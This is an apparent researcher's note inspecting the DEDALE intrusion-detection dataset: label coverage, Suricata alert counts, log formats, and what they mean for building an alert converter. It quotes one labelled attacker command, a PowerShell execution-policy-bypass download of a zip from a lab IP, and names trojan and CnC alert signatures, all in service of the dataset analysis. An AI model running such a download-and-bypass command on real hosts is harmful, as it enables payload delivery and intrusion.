# DEDALE — what the downloaded files actually contain (inspected 2026-10-11)

Data: `D:\agentsoc_data\dedale\` (outside the repo; CC BY 4.0, DOI 10.57745/Y5JLDG). All counts below come from read-only passes over the zips (nothing extracted). Calendar: weeks 1-2 benign (2024-12-23 .. 2025-01-05), attack in week 3 (8 days), dataset ends 2025-01-19.

## Host labels (`system_logs_labels.zip`)

- **Positives only.** Each file is a list of malicious raw events (Elastic/ECS JSON as shipped by winlogbeat/auditbeat). There is no list of benign events and no alert objects; negatives would be "every other event" in the full winlogbeat/auditbeat logs (not downloaded).
- **Only three hosts are labelled:** CLIENT2 (8,440 events) and CLIENT1 (2,153) via winlogbeat; `internalserver` (5,190) via auditbeat (auditd), all on 2025-01-10.
- Class 1 ⊂ class 1+2 for both zones (clients: 9,566 of 10,593; server: 4,409 of 5,190). The class-2-only examples look like side effects of attacker processes (e.g. `conhost.exe 0xffffffff -ForceV1`, image loads). **The meaning of class 1 vs class 2 is not stated in the downloaded README** — it is in the DEDALE article / website (not yet read).
- Client events by Sysmon event id: 11 FileCreate 6,639; 7 ImageLoad 2,922; 2 FileCreateTime 315; 10 ProcessAccess 141; 18 PipeConnected 123; 5 ProcessTerminate 122; 17 PipeCreated 122; **1 ProcessCreate 121**; 22 DNS 12; plus PowerShell 800/4103/600 (72). Only 195 of 10,593 carry `process.command_line`.
- Client events by day: 01-06 462, 01-07 195, **01-08 8,038**, 01-09 195, 01-10 837, 01-11 196, 01-12 195, 01-13 475.
- Example (CLIENT2, 2025-01-06T10:01:05Z): `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'http://172.19.1.1/Bank-of-Nuthington.zip' ...`; 2025-01-08 15:01: `C:\Users\client2\AppData\Local\Temp\svcmon.exe`.
- IPs seen in the labels: CLIENT2 = 172.16.1.3 (from the Suricata match below); internalserver contacted from 172.16.1.2.

## Suricata alerts (`suricata_alerts.zip`)

- 1,465,627 alerts, all four weeks, from two routers (companyrouter2 1,258,286; companyrouter 207,341). Format: syslog lines in Suricata's one-line text format (`[gid:sid:rev] signature [Classification] [Priority] {proto} src:port -> dst:port`), **no labels**, no EVE JSON, no flow id.
- Only **33 distinct signatures**. Three account for 88%: `ET INFO User-Agent (python-requests) Inbound to Webserver` 732,828; `ET USER_AGENTS Go HTTP Client User-Agent` 301,950; `ET TROJAN Suspicious POST With Reference to WINDOWS Folder Possible Malware Infection` 250,476. All fire at the same daily rate in the benign weeks (~62-68k per weekday, ~15k per weekend day).
- Only 4 signatures first appear after the benign weeks (6 alerts in total):
  - `ET INFO Dotted Quad Host ZIP Request` ×2, 2025-01-06 10:01, 172.16.1.3 -> 172.19.1.1:80 — **matches CLIENT2's labelled Invoke-WebRequest download** (both routers saw it).
  - `ET POLICY SMB Executable File Transfer` ×1, 2025-01-08 15:05, 172.16.1.3 -> 172.16.0.2:445 — within 5 min of 6,714 labelled CLIENT2 events (svcmon.exe).
  - `ET TROJAN Suspicious POST with Common Windows Process Names` ×1, 2025-01-06 08:10, from 172.16.1.15 — no labelled host event within ±5 min; host not covered by the labels.
  - `ET TROJAN Backdoor family PCRat/Gh0st CnC traffic` ×2, 2025-01-08, from 172.16.1.30 and 172.16.1.6 to 172.16.0.2:445 — hosts not covered by the labels; status unknown.
- Ground truth for network data is in the Zeek `conn.log` labels (not downloaded).

## User behaviour (`userbehaviour_logs.zip`)

- 45 VMs × (`<ip>_<role>_ub.log`, `<ip>_<role>_timeline.csv`). The timeline is the benign activity plan: `ts, date_str, inter_event_delay, action_duration, action_type` (e.g. browsing, mailing). IPs here are on 192.168.56.0/24 (management network), not the 172.16.x addresses seen in Suricata.

## Syslog (`system_logs_syslog.zip`)

- 673 hourly `.jsonl.bz2` files. One hour (2025-01-08 00h) = 2,096 records: auditbeat 608, suricata 540 (the same alerts as above), filebeat 245, kernel 98, samba 96, postfix 160, dovecot 78, CRON 51, ovpn-server 41. Server-side Linux context, not alerts.

## Consequences for the converter

1. DEDALE does not ship labelled alerts. Alerts must be generated (e.g. Sigma rules over winlogbeat/auditbeat events) or taken from Suricata; labels must be joined from the event lists (host) or Zeek conn.log (network).
2. Host-level negatives and the benign-week baseline need the full winlogbeat log (27.1 GB compressed) — the labels alone give positives only.
3. Suricata alone is a realistic alert-fatigue stream but nearly blind to this APT (3 alerts match labelled activity out of 1.47 M), and only 3 hosts have ground truth.
